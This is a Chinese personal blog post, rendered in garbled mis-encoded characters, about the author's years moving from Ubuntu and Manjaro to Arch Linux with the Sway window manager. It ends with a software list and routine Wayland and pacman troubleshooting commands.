Linuxä¹‹åï¼Œæˆ‘åŸºæœ¬ä¸Šä¸å†æ”¹å˜è‡ªå·±çš„å‘è¡Œç‰ˆäº†ï¼Œåªæ˜¯ä¼šåœ¨å›¾å½¢ç•Œé¢æŠ˜è…¾ä¸€äº›ã€‚2020å¹´-2021å¹´ä¸ŠåŠå¹´æˆ‘ä½¿ç”¨çš„éƒ½æ˜¯KDEï¼Œå¥½çœ‹æ˜¯çœŸå¥½çœ‹ï¼Œä½†æ˜¯Bugä¹Ÿæ˜¯çœŸçš„è‡´å‘½ï¼Œè¿™å…¶ä¸­æˆ‘äº²èº«ç»å†è¿‡çš„è‡³å°‘ä¸‰æ¬¡é‡å¤å‡ºç°åœ¨ä¸åŒç”µè„‘ï¼ˆthinkpad T480å‡ºç°è¿‡ï¼Œthinkbook 14p å‡ºç°è¿‡ï¼‰çš„bugå°±æ˜¯ç›’ç›–ç¡çœ å¤±è´¥ï¼Œæˆ‘ä¸çŸ¥é“æ˜¯è°å¼•èµ·çš„ï¼Œæ˜¯plasmaè¿˜æ˜¯conkyè¿˜æ˜¯åˆ«çš„ä»€ä¹ˆç»„ä»¶ï¼Œæˆ‘ä¸çŸ¥é“ï¼Œæˆ‘åœ¨æ—¥å¿—é‡Œä¹ŸæŸ¥ä¸åˆ°ã€‚åˆ«çœ‹è¿™ä¸ªé—®é¢˜å¥½åƒæ²¡ä»€ä¹ˆï¼Œä½†æ˜¯ä½œä¸ºä¸€ä¸ªç¬”è®°æœ¬ç”¨æˆ·ï¼Œç›’ç›–åæ”¾è¿›åŒ…é‡Œæ˜¯ä¸€ä¸ªéå¸¸è‡ªç„¶çš„è¡Œä¸ºï¼Œå›åˆ°å®¿èˆæ²¡æœ‰ç¬¬ä¸€æ—¶é—´æ‹¿å‡ºç”µè„‘è€Œæ˜¯ä¼‘æ¯ä¸€ä¼šä¹Ÿæ˜¯å¾ˆæ­£å¸¸çš„è¡Œä¸ºï¼Œä½†æ˜¯ä¼‘æ¯å®Œåå‘ç°è‡ªå·±çš„ç”µè„‘åœ¨åŒ…é‡Œå˜æˆäº†ä¸€ä¸ªé“æ¿çƒ§å°±ä¸æ˜¯ä¸€ä¸ªæ­£å¸¸çš„ç°è±¡äº†ã€‚å˜´ç¡¬çš„äººå½“ç„¶ä¼šè¯´thinkpadä¸æ˜¯æœ‰æŒ‡ç¤ºç¯å—ï¼Ÿä½ çœ‹æŒ‡ç¤ºç¯åˆ¤æ–­æ˜¯å¦ç¡çœ æˆåŠŸä¸å°±è¡Œäº†ï¼Ÿä¸”ä¸è¯´æˆ‘åæ¥çš„ç”µè„‘thinkbook 14pæ˜¯æ²¡æœ‰æŒ‡ç¤ºç¯çš„ï¼Œå•å°±ç³»ç»Ÿè´¨é‡è€Œè¨€ï¼Œä¸€ä¸ªç³»ç»Ÿæ¯æ¬¡ä½¿ç”¨çš„æ—¶å€™éƒ½éœ€è¦ç”¨æˆ·å°å¿ƒç¿¼ç¿¼ç›¯ç€æŒ‡ç¤ºç¯çœ‹ï¼Œæ˜¯å¦å·²ç»è¯´æ˜äº†è¿™æ˜¯ä¸€ä¸ªç³Ÿç³•çš„ç³»ç»Ÿäº†ï¼Ÿä¸ºä»€ä¹ˆæ¢æˆthinkbookï¼Ÿå°±æ˜¯å› ä¸ºè¿™ä¸ªbugæŠŠæˆ‘çš„thinkpadçš„ä¸»æ¿çƒ§åäº†ï¼æˆ‘æ›¾ä»¥ä¸ºè¿™æ˜¯thinkpadç‹¬æœ‰çš„é—®é¢˜ï¼Œå¯æ˜¯å½“thinkbookä¹Ÿå‘ç”ŸåŒæ ·é—®é¢˜çš„æ—¶å€™æˆ‘å¯¹KDEå½»åº•å¤±æœ›äº†ï¼Œæ˜¯çš„ï¼Œè¿™æ˜¯ä¸€ä¸ªå¾ˆæ¼‚äº®çš„æ¡Œé¢ç¯å¢ƒï¼Œå®šåˆ¶æ€§å¼ºåˆæœ‰å¾ˆå¤šç‰¹æ•ˆï¼Œå¯æ˜¯è¿™ä¸€åˆ‡éƒ½å»ºç«‹åœ¨ä¸€äº›ä¸ç¨³å®šçš„bugä¸Šçš„æ—¶å€™ï¼Œè¿™äº›ç‰¹æ•ˆä¼šæ›´å¤šæ‰®æ¼”èµ·bugçš„å¯¼ç«ç´¢è§’è‰²ã€‚\nç»å†è¿‡KDEçš„bugåï¼Œæˆ‘å¯¹å¤æ‚çš„æ¡Œé¢ç¯å¢ƒäº§ç”Ÿäº†ææƒ§ï¼Œä»–ä»¬å°±åƒæ˜¯ä¸€æšä¸å®šæ—¶ç‚¸å¼¹ã€‚åœ¨è¿™ä¸ªå‰æèƒŒæ™¯ä¸‹ï¼Œæˆ‘æ¥è§¦å¹¶å¼€å§‹ä½¿ç”¨SwayWMï¼Œä¸€ç›´åˆ°ä»Šå¤©ï¼Œæˆ‘ä¹Ÿè¿˜åœ¨ä½¿ç”¨ï¼Œè€Œé‚£ä¸ªè‡´å‘½Bugï¼Œå·²ç»ç¦»æˆ‘è¿œå»ã€‚\nä½“éªŒ å¾—ç›ŠäºArch Linuxåºå¤§çš„ç”¨æˆ·ç¾¤ï¼ŒArch çš„è½¯ä»¶åŒ…ç”Ÿæ€åœ¨ä¸€ä¼—å‘è¡Œç‰ˆä¸­å¯ä»¥è¯´æ˜¯ç§°ç‹ç§°éœ¸äº†ï¼Œæˆ‘ä¸¾ä¸€ä¸ªä¾‹å­ï¼Œä½ èƒ½æƒ³è±¡åœ¨Linuxçš„è½¯ä»¶ä»“åº“ä¸­ä¼šå‡ºç°deepin-wineé­”æ”¹åçš„è…¾è®¯ç³»è½¯ä»¶å—ï¼Ÿ\næ¯æ¬¡çœ‹åˆ°å…¶ä»–å‘è¡Œç‰ˆç”¨æˆ·æ‰‹åŠ¨ä¸‹è½½debç„¶åå®‰è£…çš„æ—¶å€™ï¼Œæˆ‘éƒ½ä¼šäº§ç”Ÿä¸€ç§ä»–ä»¬æ˜¯ä¸æ˜¯åœ¨ç”¨windowsçš„é”™è§‰ï¼Œå¹¶ä¸æ˜¯çœ‹ä¸èµ·åˆ«çš„å‘è¡Œç‰ˆï¼Œåªæ˜¯å„æœ‰åˆ†å·¥å’Œä¾§é‡ç‚¹ï¼Œæ¯”å¦‚Archçš„å®šä½æ˜¯æ¡Œé¢ç«¯ç”¨æˆ·ï¼Œè€Œå¾ˆå¤šåˆ«çš„å‘è¡Œç‰ˆçš„å®šä½æ˜¯æœåŠ¡å™¨ï¼Œæˆ‘ä¸ä¼šç”¨åˆ«çš„å‘è¡Œç‰ˆå½“ä½œæˆ‘çš„æ¡Œé¢ç³»ç»Ÿï¼Œå°±åƒæˆ‘ä¸ä¼šæŠŠArchè£…åœ¨æœåŠ¡å™¨ä¸Šä¸€æ ·ã€‚ç”¨ç»Ÿä¸€çš„åŒ…ç®¡ç†å™¨ç®¡ç†è½¯ä»¶åŒ…è‚¯å®šæ˜¯æœ‰å¥½å¤„çš„ï¼Œèƒ½å¤Ÿå¤§å¤§å‡è½»ç”¨æˆ·çš„å¿ƒæ™ºè´Ÿæ‹…ã€‚\nè‡³äºç½‘ç»œä¸Šæåˆ°çš„Arch Linuxä¸ç¨³å®šã€å®¹æ˜“æ»šæŒ‚çš„é—®é¢˜ï¼Œä¸å¥½æ„æ€ï¼Œæˆ‘ç”¨äº†ä¸¤å¹´Archäº†ï¼Œæ¯å¤©éƒ½æ‰§è¡Œyay -Syyuï¼Œä»æ¥æ²¡æœ‰å‡ºç°æ»šæŒ‚çš„é—®é¢˜ï¼Œç›¸åï¼Œæˆ‘ç›®å‰æ‰€é‡åˆ°çš„åŠæ•°Linuxç›¸å…³é—®é¢˜ï¼Œéƒ½æ˜¯å› ä¸ºç³»ç»Ÿè½¯ä»¶æˆ–è€…ä¾èµ–åº“è¿‡äºè€æ—§è€Œå¯¼è‡´çš„ï¼Œæ›´æ–°åå°±å¯ä»¥è§£å†³ã€‚Linuxä¸æ˜¯Windowsï¼Œå¦‚æœä½ ä¸æƒ³è¦æ›´æ–°ï¼Œé‚£ä¹ˆæœ‰ä¸¤ç§é€‰æ‹©ï¼Œç¬¬ä¸€ç§ï¼Œé”å®šè‡ªå·±çš„è½¯ä»¶ç‰ˆæœ¬ï¼Œç„¶ååœ¨æ¯æ¬¡å®‰è£…æ–°è½¯ä»¶çš„æ—¶å€™å•ç‹¬è§£å†³ä¾èµ–é—®é¢˜ï¼›ç¬¬äºŒç§ï¼Œå›å»ç”¨windowsã€‚\nè¯´å®Œäº†Arch Linuxï¼Œå†æ¥è¯´è¯´Swayï¼Œè¿™æ˜¯ä¸€ä¸ªç®€å•çš„waylandçª—å£ç®¡ç†å™¨ï¼Œä¸ºä»€ä¹ˆç”¨waylandï¼Œå› ä¸ºæˆ‘ä¸å¸Œæœ›è‡ªå·±çš„å›¾å½¢ç•Œé¢å»ºç«‹åœ¨ä¸€ä¸ªè€æ—§è€Œéš¾ä»¥ç»´æŠ¤çš„åŸºç¡€è®¾æ–½ä¹‹ä¸Šï¼Œé‚£ç»™æˆ‘çš„æ„Ÿè§‰å°±å¥½åƒæˆ‘åœ¨ä½¿ç”¨å¦ä¸€ä¸ªplasmaã€‚è¯šç„¶ï¼Œwaylandè¿˜æœ‰å¾ˆé•¿çš„ä¸€æ®µè·¯è¦èµ°ï¼Œå¾ˆå¤šæ¡Œé¢è½¯ä»¶éƒ½ä¸å¾—ä¸å€ŸåŠ©xwaylandæ‰èƒ½åœ¨å…¶ä¸Šè¿è¡Œï¼Œç»è¿‡å®é™…ä½¿ç”¨ï¼Œé™¤äº†åœ¨4kå±å¹•ä¸Šxwaylandæœ‰é—®é¢˜ä¹‹å¤–ï¼Œå…¶ä»–æƒ…å†µä¸‹è¿˜æ˜¯å¯ä»¥å®Œç¾å·¥ä½œçš„ã€‚å½“ç„¶ï¼Œéƒ¨åˆ†è½¯ä»¶æ˜¯æœ‰é—®é¢˜çš„ï¼Œæ¯”å¦‚è…¾è®¯ä¼šè®®çš„æ¡Œé¢å…±äº«åŠŸèƒ½ï¼Œä½†æ˜¯ä¹Ÿå·²ç»æœ‰äº†æ›²çº¿æ•‘å›½çš„åŠæ³•ï¼Œæ‰€ä»¥ç°åœ¨waylandçš„ç”Ÿæ€å·²ç»æ¯”ä¹‹å‰è¦å¥½ä¸€äº›äº†ï¼Œå½“æˆ‘çœ‹åˆ°linux qqå†…æµ‹ç¾¤é‡Œæœ‰äººæå‡ºwaylandä¸‹çš„é—®é¢˜ä»¥åŠè¦æ±‚å…¼å®¹waylandçš„æ—¶å€™ï¼Œæˆ‘å°±ç›¸ä¿¡æœªæ¥è¿˜ä¼šæ›´å¥½ã€‚\nSwayæ˜¯ä¸€ä¸ªçª—å£ç®¡ç†å™¨ï¼Œå¼€å‘è€…åšçš„äº‹æƒ…æ˜¯åœ¨waylandä¸‹å¤åˆ»ä¸€ä¸ªi3wmå‡ºæ¥ã€‚çª—å£ç®¡ç†å™¨çš„å¥½å¤„æ˜¯æˆ‘ç°åœ¨æ›´å¤šä¾èµ–é”®ç›˜è€Œä¸æ˜¯é¼ æ ‡äº†ï¼Œå¯ä»¥å‡å°‘å¯¹è§†è§‰èšç„¦äºé¼ æ ‡è¿™ç§è¡Œä¸ºçš„ä¾èµ–ï¼Œè½¬è€Œæ›´å¤šä¾èµ–è‡ªå·±çš„è§¦è§‰ï¼Œå¦å¤–ï¼Œæ›´å°‘çš„ç‰¹æ•ˆå’Œæ›´ç®€æ´çš„è®¾è®¡ä¸ä»…è®©æˆ‘çš„ç³»ç»Ÿå¤§å¤§å¢å¼ºäº†ç¨³å®šæ€§ï¼ˆæ®ä¸€ä½ç”¨KDEçš„åŒå­¦è¯´ï¼Œç›´åˆ°ä»Šå¤©ï¼Œç”¨KDEåªè¦ä¸€å‘¨ä¸å…³æœºå°±å¿…å®šä¼šå´©æºƒï¼‰ï¼Œè¿˜è®©æˆ‘è‡ªå·±æ›´åŠ ä¸“æ³¨äºæ‰‹å¤´çš„å·¥ä½œï¼ˆå¹³é“ºå¼çª—å£ç®¡ç†å™¨çš„ç»Ÿä¸€å¥½å¤„ï¼‰ã€‚ä¸å¥½çš„åœ°æ–¹å½“ç„¶ä¹Ÿæœ‰ä¸å°‘ï¼Œæ¯”å¦‚åˆæ¬¡æ¥è§¦çš„æ—¶å€™è¦èŠ±å¾ˆå¤šæ—¶é—´å»é…ç½®å’Œé€‚åº”ï¼Œæ¯”å¦‚æ¯æ¬¡ä¿®æ”¹æ“ä½œé”®ä½çš„æ—¶å€™éƒ½éœ€è¦ä¸€å®šæ—¶é—´å»é‡æ–°é€‚åº”ï¼Œæ¯”å¦‚fcitx5åœ¨æŸäº›è½¯ä»¶ä¸‹é¢æ— æ³•å·¥ä½œæˆ–è€…æ˜¯æœ‰ç¼ºé™·ï¼ˆè¿™ä¸æ˜¯fcitx5çš„é”…ï¼‰ï¼Œæ¯”å¦‚å®ƒè®©æˆ‘è®¤è¯†åˆ°è‡ªå·±æ˜¯ä¸€ä¸ªå¾ˆç¬¨è›‹çš„äººï¼Œä½¿ç”¨äº†ä¸€å¹´äº†ï¼Œè®©æˆ‘æ—¶ä¸æ—¶å°±å‘ç°è‡ªå·±çš„æ“ä½œä¹ æƒ¯å¯ä»¥æœ‰ä¼˜åŒ–ç©ºé—´ï¼Œæ¯”å¦‚ï¼š\nåœ¨æŒ‰win+æ•°å­—é”®çš„æ—¶å€™ï¼Œç”¨å¤§æ‹‡æŒ‡å»æŒ‰æ˜¯å¾ˆæ‰­æ›²çš„å§¿åŠ¿ï¼Œ**ä¸€ä¸ªæ›´åŠ è‡ªç„¶çš„å§¿åŠ¿æ˜¯ç”¨å·¦æ‰‹çš„æŒå¿ƒå·¦ä¸‹ï¼ˆæ‰‹èƒŒè§†è§’ï¼‰çš„éƒ¨åˆ†å»å‹winé”®ï¼Œç„¶åç”¨æ‰‹æŒ‡å»æŒ‰æ•°å­—é”®ã€‚**å¦‚æœè¦æŒ‰ctrl+winï¼Œå°±ç”¨åŒæ ·çš„éƒ¨ä½å‹ä½ä¸¤ä¸ªé”®ï¼Œè¿™ä¸ªéš¾åº¦ä¼šå¤§ä¸€äº›ï¼Œå¤§æ¦‚ç¡®å®è¿˜å¯ä»¥ä¼˜åŒ–çš„ã€‚ è°ƒæ•´çª—å£å¤§å°çš„æ—¶å€™ï¼Œè¿›å…¥resizeæ¨¡å¼ç„¶åç”¨é”®ç›˜å»æŒ‰æ˜¯å¾ˆä½æ•ˆçš„è¡Œä¸ºï¼Œç›¸åï¼Œè¿™ç§æ—¶å€™ä¾èµ–é¼ æ ‡ä¸æ˜¯ä»€ä¹ˆåäº‹ï¼Œé€šè¿‡æŠŠé¼ æ ‡æ‚¬åœåœ¨çª—å£ä¸Šç„¶åæŒ‰ä½å³é”®è¿›è¡Œæ‹–æ‹½å°±å¯ä»¥å®ç°å¿«é€Ÿçš„çª—å£å¤§å°è°ƒæ•´ã€‚ scratchpadä¸­æ›´é€‚åˆä½¿ç”¨tabæ¨¡å¼ã€‚ æœ‰çš„æ—¶å€™åœ¨ä¸¤ä¸ªworkspaceä¹‹é—´åˆ‡æ¢ä¼šå¾ˆé¢‘ç¹ï¼Œè¿™ä¸ªæ—¶å€™æ›´é€‚åˆç”¨workspace back_and_forthè€Œä¸æ˜¯ä¸€ç›´æ‰§ç€äºç”¨æ•°å­—é”®å»åˆ‡æ¢ï¼Œæˆ–è€…ä½¿ç”¨é¼ æ ‡çš„æ»šè½®æ¥åˆ‡æ¢ï¼Œè¿™ä¹Ÿæ˜¯ä¸€ä¸ªä¸é”™çš„ä¸»æ„ã€‚ é™¤æ­¤ä¹‹å¤–è¿˜æœ‰ä¸€ä¸ªå°çš„ä¼˜ç‚¹ï¼Œåœ¨swayä¸‹å¯ä»¥ç»™ä¸åŒé”®ç›˜æ¢ä¸Šä¸åŒçš„å¸ƒå±€ï¼Œè¿™ç‚¹å¯¹æˆ‘è€Œè¨€æ˜¯åˆšéœ€ï¼Œä½†æ˜¯åœ¨xorgä¸‹é¢ï¼Œè¿™ç§æ“ä½œå¾€å¾€åªèƒ½å°†åŒä¸€ä¸ªå¸ƒå±€åº”ç”¨äºæ‰€æœ‰çš„é”®ç›˜ï¼Œä¸€æ—¦å¸ƒå±€å‡ºç°äº†é—®é¢˜å¯¼è‡´é”®ç›˜ä¸å¯ç”¨ï¼Œé‚£ä¹ˆæ‰€æœ‰çš„é”®ç›˜éƒ½ä¼šå˜å¾—ä¸å¯ç”¨ã€‚\næœ€åï¼Œæˆ‘å’Œå¤§éƒ¨åˆ†çš„geekç”¨æˆ·ä¸ä¸€æ ·ï¼Œæˆ‘æ¯”è¾ƒç¬¨ï¼Œåªæ˜¯ä¸€ä¸ªæ™®é€šç”¨æˆ·ï¼Œæˆ‘åšä¸åˆ°ä¹Ÿä¸æƒ³å»å’Œä»–ä»¬ä¸€æ ·è§†é¼ æ ‡å¦‚æ´ªæ°´çŒ›å…½ï¼Œç›¸åï¼Œswayä¸‹æˆ‘è¿˜æ˜¯ä¼šé¢‘ç¹ä½¿ç”¨é¼ æ ‡ï¼Œå¯¹æˆ‘æ¥è¯´ç”¨é¼ æ ‡å»äº¤äº’ä¸¤ä¸ªçª—å£çš„ä½ç½®ä¾æ—§æ˜¯æ¯”ç”¨é”®ç›˜æ›´åŠ é«˜æ•ˆçš„æ“ä½œã€‚æ‰€ä»¥æˆ‘æƒ³è¯´çš„æ˜¯ï¼Œè¿½æ±‚å±äºè‡ªå·±çš„å®ç”¨æ€§ï¼Œä½ å¯ä»¥å»å‚è€ƒåˆ«äººçš„å»ºè®®ï¼Œä½†æ˜¯æœ€ç»ˆè¿˜æ˜¯è¦æ‰¾åˆ°å±äºä½ è‡ªå·±çš„ä¹ æƒ¯ã€‚ å¯¹äºæˆ‘ä¸ªäººæ¥è¯´ï¼Œ æˆ‘ä¹Ÿå®Œå…¨ä¸æ’é™¤åœ¨plasmaçš„bugä¿®å¤åå›åˆ°plasmaçš„å¯èƒ½æ€§ï¼Œæ¯•ç«Ÿè€ç‰Œæ¡Œé¢ã€‚\nåˆ—å‡ºæˆ‘ä½¿ç”¨çš„è½¯ä»¶ï¼š\næ¡Œé¢ç¯å¢ƒ SwayWMï¼ˆçª—å£ç®¡ç†ï¼‰ waybarï¼ˆä¿¡æ¯å±•ç¤ºæ ï¼‰ ç»ˆç«¯ alacritty æµè§ˆå™¨ firefox-developer-edition ï¼ˆä¸»åŠ›ï¼‰ chrome è¾“å…¥æ³• fcitx5 ä»£ç ç¼–è¾‘ Neovimï¼ˆä¸»åŠ›ï¼‰ Vscodeï¼ˆå‰¯æ‰‹ï¼‰ Jetbrains åšç¬”è®° Neovim-qt zotero æ–‡ä»¶æµè§ˆå™¨ ranger dolphin çœ‹è®ºæ–‡ zotero okular æ¸¸æˆ steamï¼ˆæ³°æ‹‰ç‘äºšã€é»‘æš—ä¹‹é­‚â€¦â€¦ï¼‰ waydroidï¼ˆæ˜æ—¥æ–¹èˆŸï¼‰ HMCLï¼ˆminecraftï¼‰ å·¥å…·æ›¿ä»£ exa æ›¿ä»£ ls zoxide æ›¿ä»£ cd scp æ›¿ä»£ cp Trouble Shooting å…³æœºçš„æ—¶å€™å‡ºç° a stoping job is running for xxx hangout ä¿®æ”¹/etc/systemd/system.conf\nDefaultTimeoutStopSec=5s JAVAç¨‹åºåœ¨waylandä¸‹æ— æ³•å¯åŠ¨ æ·»åŠ ç¯å¢ƒå˜é‡\n_JAVA_AWT_WM_NONREPARENTING=1 AVD åœ¨waylandä¸‹æ— æ³•å¯åŠ¨ ç”¨ä¸‹é¢çš„è¯­å¥å¯åŠ¨android-studioå†å»å¯åŠ¨avd\nQT_QPA_PLATFORM=xcb _JAVA_AWT_WM_NONREPARENTING=1 android-studio waylandä¸‹ç©æ¸¸æˆ æ·»åŠ ç¯å¢ƒå˜é‡\nSDL_VIDEODRIVER=x11 waybar åœ¨swayå¯åŠ¨åå¾ˆä¹…æ‰å‡ºç° swayé…ç½®ä¸­æ·»åŠ \nexec hash dbus-update-activation-environment 2\u0026gt;/dev/null \u0026amp;\u0026amp; \\ dbus-update-activation-environment --systemd DISPLAY WAYLAND_DISPLAY SWAYSOCK sway é¡¶éƒ¨æ å‡ºç°ä¸­æ–‡åé«˜åº¦å˜åŒ– åœ¨swayé…ç½®æ–‡ä»¶ä¸­æ·»åŠ ä»¥ä¸‹è®¾ç½®æ¥ç»Ÿä¸€ä½¿ç”¨ä¸€ä¸ªé«˜é«˜çš„å­—ç¬¦çš„é«˜åº¦.\nfor_window [title=\u0026#34;.*\u0026#34;] title_format ã‚œ%titleã‚œ waylandä¸‹çš„è…¾è®¯ä¼šè®® é¦–å…ˆæ–°å»ºè™šæ‹Ÿæ‘„åƒå¤´\nsudo modprobe v4l2loopback devices=1 video_nr=10 card_label=\u0026#39;OBS Cam\u0026#39; exclusive_caps=1 sudo modprobe snd-aloop index=10 id=\u0026#39;OBS Mic\u0026#39; pacmd \u0026#39;update-source-proplist alsa_input.platform-snd_aloop.0.analog-stereo device.description=\u0026#34;OBS Mic\u0026#34;\u0026#39; ç„¶åæ‰“å¼€obsï¼Œç‚¹å‡»è¦å…±äº«çš„å±å¹•ï¼Œç‚¹å‡»start virtual cameraã€‚è¿™ä¸ªæ—¶å€™å†è¿›å…¥è…¾è®¯ä¼šè®®ï¼Œé€‰æ‹©è§†é¢‘ï¼ˆä¸æ˜¯å±å¹•å…±äº«ï¼‰ï¼Œç„¶åæŠŠè§†é¢‘çš„è¾“å…¥æºåˆ‡æ¢åˆ°è¿™ä¸ªè™šæ‹Ÿæ‘„åƒå¤´å°±å¯ä»¥è¾¾åˆ°å±å¹•å…±äº«çš„æ•ˆæœäº†ã€‚\nGTKé—®é¢˜ ä¸è¦åœ¨ç¯å¢ƒå˜é‡ä¸­è®¾ç½®GDK_BACKEND=wayland, GTKç¨‹åºä¼šè‡ªåŠ¨ä¼˜å…ˆé€‰æ‹©wayland,å¦‚æœä¸è¡Œä¼šè‡ªåŠ¨åˆ‡æ¢åˆ°xwayland\nerror: GPGME error: No data sudo rm -f /var/lib/pacman/sync/* sudo pacman -Sc ","permalink":"https://dragonbox.top/posts/tech-arch-sway/","summary":"\u003cp\u003eä¸çŸ¥ä¸è§‰ä½¿ç”¨swayå·²ç»æ•´æ•´ä¸€å¹´äº†ï¼Œäºæ˜¯æ¥è°ˆä¸€è°ˆè‡ªå·±è¿™ä¸€å¹´çš„ä½¿ç”¨æ„Ÿå—ï¼Œé¡ºä¾¿å›é¡¾äº†ä¸€ä¸‹è¿‡å»ã€‚\u003c/p\u003e\n\u003ch2 id=\"èµ·å› \"\u003eèµ·å› \u003c/h2\u003e\n\u003cp\u003e2019å¹´ï¼Œåœ¨ä¸€æ¬¡ç¼–ç¨‹ä½œä¸šçš„æ—¶å€™ï¼ŒåŒä¸“ä¸šçš„å¦ä¸€ä¸ªè€å“¥å‘æˆ‘å±•ç¤ºäº†vimçš„ä»£ç hè¡¥å…¨ï¼Œæˆ‘ç«‹åˆ»è¢«è¿™ç§ç®€é™‹ä½†æ˜¯æ‰©å±•æ€§æå¼ºçš„ä»£ç ç¼–è¾‘å™¨å¸å¼•äº†ï¼Œäºæ˜¯å½“æ—¶è¿˜æ˜¯ä¸ªåˆšè½¬å…¥è®¡ç®—æœºä¸“ä¸šçš„å°ç™½å°±å¼€å§‹å“¼å“§å“¼å“§åœ°å­¦ä¹ vimçš„é…ç½®å’Œæ’ä»¶çš„å®‰è£…ã€‚å½“ç„¶ï¼Œè¿™äº›éƒ½å‘ç”Ÿåœ¨æˆ‘çš„Kali Linuxè™šæ‹Ÿæœºä¸­ã€‚\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"image-20221217104938577.png\" alt=\"image-20221217104938577\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eé‚£ä¸ªæ—¶å€™æˆ‘æ­£æ¥è§¦CTFï¼Œå¾ˆå¤šæ—¶å€™éƒ½è¦å¼€ç€è™šæ‹Ÿæœºï¼Œäºæ˜¯æœ‰ä¸€å¤©åŠ¨èµ·äº†æŠŠç”µè„‘ç³»ç»Ÿç›´æ¥è£…æˆlinuxçš„æƒ³æ³•ã€‚å› ä¸ºè‡ªå·±çš„ç¬¬ä¸€å°ç¬”è®°æœ¬æ˜¯æš—å¤œç²¾çµ2ï¼Œæ¸¸æˆæœ¬è£…Linuxï¼Œç¬¬ä¸€ä¸ªè¦è€ƒè™‘çš„å°±æ˜¯å…¼å®¹æ€§å’Œç¨³å®šæ€§ï¼Œåœ¨æƒè¡¡å„ä¸ªå‘è¡Œç‰ˆçš„ä¼˜åŠ¿å’Œæµè¡Œç¨‹åº¦åï¼Œæˆ‘é€‰æ‹©äº†ubuntu18.04ã€‚ç¬”è®°æœ¬é‡è£…å®Œæ¯•åé™¤äº†é£æ‰‡è½¬ä¸ªä¸åœç«Ÿç„¶ä¸€åˆ‡è¿è¡Œæ­£å¸¸ï¼Œè¿™è®©æˆ‘å®åœ¨æœ‰äº›æƒŠå–œï¼Œè€Œé£æ‰‡é—®é¢˜æ˜¯è‹±ä¼Ÿè¾¾ç‹¬æ˜¾å¯¼è‡´çš„ï¼Œåœ¨ubuntuä¸Šï¼Œåªéœ€è¦ä¸€æ¡\u003ccode\u003esudo ubuntu-drivers autoinstall\u003c/code\u003eå°±å®Œç¾è§£å†³äº†ã€‚å½“æ—¶çš„è‡ªå·±å¾ˆå¼€å¿ƒï¼Œä»¿ä½›æ‰“å¼€äº†ä¸€é“æ–°ä¸–ç•Œçš„å¤§é—¨ã€‚\u003c/p\u003e\n\u003cp\u003eåæ¥ï¼Œæˆ‘å»å‰æ—å‚åŠ äº†ç¬¬ä¸€æ¬¡çº¿ä¸‹èµ›ï¼Œubuntuæ²¡æœ‰æ‰é“¾å­ï¼Œå¸®æˆ‘æ‹¿äº†ä¸€ä¸ªä¸€è¡€ï¼Œæˆ‘å¾ˆæ»¡æ„ã€‚ç›´åˆ°ä¸€æ¬¡ä¸Šè¯¾ï¼Œæ‰‹è´±æ‰§è¡Œäº†\u003ccode\u003eapt upgrade\u003c/code\u003eï¼Œå‡çº§å®Œç”µè„‘ç«Ÿç„¶æ— æ³•å¼€æœºäº†ï¼Œä¸€æ•´ä¸ªæ— è¯­ï¼Œè€Œå½“æ—¶ä¸´è¿‘æœŸæœ«ï¼Œæˆ‘å·²ç»æ²¡æœ‰æ—¶é—´å†å»æŠ˜è…¾ç³»ç»Ÿäº†ï¼Œäºæ˜¯ç´§æ€¥å®‰è£…äº†windowsåº”ä»˜æœŸæœ«å¤ä¹ ï¼Œé¡ºä¾¿ä¸‹å•äº†ä¸€å°å¯¹Linuxæ›´åŠ å‹å¥½çš„ç¬”è®°æœ¬Thinkpad T480ã€‚\u003c/p\u003e\n\u003cp\u003eæœŸæœ«è€ƒè¯•ç»“æŸåï¼Œæˆ‘å¬è¯´äº†Arch Linux çš„å¤§åï¼Œä½†æ˜¯å‡ºäºç•éš¾æƒ…ç»ªï¼Œæˆ‘é€‰æ‹©å°†ubuntu18.04å®‰è£…åœ¨æˆ‘çš„thinkpad t480ä¸Šï¼Œç„¶åå»å‚åŠ xmançš„å¤ä»¤è¥ã€‚åœ¨å¤ä»¤è¥æœŸé—´ï¼Œæˆ‘çš„ç”µè„‘åœ¨è¿æ¥wifiä¸€æ®µæ—¶é—´åå°±å†ä¹Ÿè¿æ¥ä¸ä¸Šäº†ï¼Œç¬¬ä¸€æ¬¡æˆ‘é€‰æ‹©äº†é‡è£…ï¼Œä½†æ˜¯ç¬¬äºŒæ¬¡è¿˜æ˜¯åŒæ ·çš„é—®é¢˜ï¼Œæˆ‘åªå¥½ç»æœ›åœ°å›åˆ°windows10ï¼Œäº‹ååˆ†æçš„æ—¶å€™ï¼Œæˆ‘è§‰å¾—åº”è¯¥æ˜¯é©±åŠ¨çš„é—®é¢˜ï¼Œthinkpad t480æ˜¯2018å¹´ä¸‹åŠå¹´å‘å¸ƒçš„ï¼Œubuntu18.04çš„é©±åŠ¨å¯èƒ½ç¡®å®æ²¡è¦†ç›–åˆ°å®ƒçš„ç½‘å¡ã€‚\u003c/p\u003e\n\u003cp\u003eä¹‹åçš„å¥½å‡ ä¸ªæœˆé‡Œï¼Œæˆ‘éƒ½ä¹–ä¹–ç”¨ç€windows10å’ŒWSL2ï¼Œå®ä¹ çš„æ—¶å€™å…¨ç¨‹åœ¨è™šæ‹Ÿæœºé‡Œé¢å†™ä»£ç ã€‚ç­‰åˆ°å®ä¹ ç»“æŸã€ä¿ç ”ä¹Ÿç»“æŸçš„æ—¶å€™ï¼Œæˆ‘åˆå¼€å§‹äº†æ–°ä¸€è½®çš„æŠ˜è…¾ã€‚\u003c/p\u003e\n\u003cp\u003e2020å¹´ä¸‹åŠå¹´ï¼Œæˆ‘å°†è‡ªå·±çš„ä¸»åŠ›ç”µè„‘å…¨é¢è¿ç§»åˆ°äº†Manjaro Linuxä¸‹ï¼Œé‚£ä¸ªæ—¶å€™qv2rayè¿˜å¾ˆæ´»è·ƒï¼Œæˆ‘çš„ç§‘å­¦ä¸Šç½‘ä¹Ÿå¾ˆä¾èµ–å®ƒï¼Œä½†æ˜¯æœ‰å¥½å‡ 